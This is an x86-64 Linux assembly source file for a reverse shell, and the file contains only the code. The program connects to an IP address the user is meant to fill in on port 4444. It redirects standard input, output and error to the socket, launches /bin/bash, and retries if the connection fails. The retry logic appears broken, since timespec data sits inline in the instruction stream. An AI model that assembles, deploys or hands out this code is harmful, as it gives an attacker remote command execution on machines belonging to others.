section .data
    command db '/bin/bash', 0
    ip_str db '', 0 ; Put IP address here
    port_str db '4444', 0
    
    err_ip_format db 'Error: Invalid IP format', 10, 0
    err_wrong_port db 'Error: Port must be 4444', 10, 0
    err_socket db 'Error: Socket creation failed', 10, 0

section .bss
    ip_bytes resd 1
    port_bytes resw 1

section .text
    global _start

_start:
    call validate_and_parse_ip
    test rax, rax
    jz ip_format_error
    
    ; Validate port
    call validate_port
    test rax, rax
    jz port_error
    
    jmp connect

validate_and_parse_ip:
    push rbp
    mov rbp, rsp
    push rbx
    push rcx
    push rdx
    push r9
    
    lea rsi, [ip_str]      
    lea rdi, [ip_bytes]    
    xor rbx, rbx            
    xor rax, rax            
    xor rcx, rcx            
    xor r9, r9             
    
parse_ip_loop:
    movzx rdx, byte [rsi + rcx]  
    test rdx, rdx                
    jz validate_last_octet
    
    cmp rdx, '.'                 
    je store_octet
    
    cmp rdx, '0'
    jb ip_invalid
    cmp rdx, '9'
    ja ip_invalid
    
    sub rdx, '0'
    imul rax, 10
    add rax, rdx
    
    cmp rax, 255
    ja ip_invalid
    
    inc rcx
    jmp parse_ip_loop

store_octet:
    ; Store current octet in the correct position
    cmp rbx, 3               ; Check if we have too many octets
    jae ip_invalid
    
    shl r9, 8
    or r9, rax
    
    inc rbx
    xor rax, rax             ; Reset for next octet
    inc rcx
    jmp parse_ip_loop

validate_last_octet:
    ; Store the last octet
    cmp rbx, 3               ; Must be exactly 4th octet
    jne ip_invalid
    
    shl r9, 8
    or r9, rax
    
    mov eax, r9d
    bswap eax
    mov dword [ip_bytes], eax
    
    mov rax, 1               ; Success
    jmp ip_parse_done

ip_invalid:
    xor rax, rax

ip_parse_done:
    pop r9
    pop rdx
    pop rcx
    pop rbx
    pop rbp
    ret

validate_port:
    push rbp
    mov rbp, rsp
    push rsi
    
    lea rsi, [port_str]
    
    ; Check "4444"
    cmp byte [rsi], '4'
    jne port_invalid
    cmp byte [rsi+1], '4'
    jne port_invalid
    cmp byte [rsi+2], '4'
    jne port_invalid
    cmp byte [rsi+3], '4'
    jne port_invalid
    cmp byte [rsi+4], 0
    jne port_invalid
    
    ; Store port in network byte order (4444 = 0x115c)
    mov word [port_bytes], 0x5c11
    mov rax, 1
    jmp port_valid_done

port_invalid:
    xor rax, rax

port_valid_done:
    pop rsi
    pop rbp
    ret

connect:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov rax, 41
    mov rdi, 2          ; AF_INET
    mov rsi, 1          ; SOCK_STREAM
    mov rdx, 0
    syscall 
    
    test rax, rax
    js socket_error
    mov r8, rax         ; Save socket fd
    
    ; Prepare sockaddr structure on stack
    sub rsp, 16         ; Allocate space for sockaddr_in
    mov word [rsp], 2   ; AF_INET
    mov ax, [port_bytes]
    mov word [rsp+2], ax ; Port
    mov eax, [ip_bytes]
    mov dword [rsp+4], eax ; IP
    mov qword [rsp+8], 0   ; Zero padding
    
    ; connect(socket, sockaddr, 16)
    mov rdi, r8         ; Socket fd
    mov rsi, rsp        ; sockaddr structure
    mov rdx, 16         ; Address length
    mov rax, 42         ; sys_connect
    syscall
    
    add rsp, 16         ; Clean up stack
    
    test rax, rax
    js wait_and_retry
    
    xor rsi, rsi
    jmp dup2_loop

wait_and_retry:
timespec:
    dq 10
    dq 0

    ; nanosleep(10, 0)
    mov rax, 35
    lea rdi, [rel timespec]
    xor rsi, rsi
    syscall
    jmp connect

dup2_loop:
    ; dup2(client_fd, new_fd)
    mov rax, 33         ; sys_dup2
    mov rdi, r8         ; Source fd (socket)
    ; rsi contains target fd (0, 1, 2)
    syscall
    
    test rax, rax
    js exit_with_error
    
    inc rsi
    cmp rsi, 3
    jne dup2_loop
    
    ; execve("/bin/bash", NULL, NULL)
    mov rax, 59         ; sys_execve
    lea rdi, [command]
    xor rsi, rsi        ; argv = NULL  
    xor rdx, rdx        ; envp = NULL
    syscall
    
    ; Should not reach here
    jmp exit_with_error

ip_format_error:
    mov rax, 1          ; sys_write
    mov rdi, 2          ; stderr
    lea rsi, [err_ip_format]
    mov rdx, 26
    syscall
    jmp exit_with_error

port_error:
    mov rax, 1          ; sys_write
    mov rdi, 2          ; stderr
    lea rsi, [err_wrong_port]
    mov rdx, 23
    syscall
    jmp exit_with_error

socket_error:
    mov rax, 1          ; sys_write
    mov rdi, 2          ; stderr
    lea rsi, [err_socket]
    mov rdx, 28
    syscall
    jmp exit_with_error

exit_with_error:
    mov rax, 60         ; sys_exit
    mov rdi, 1          ; Exit code 1
    syscall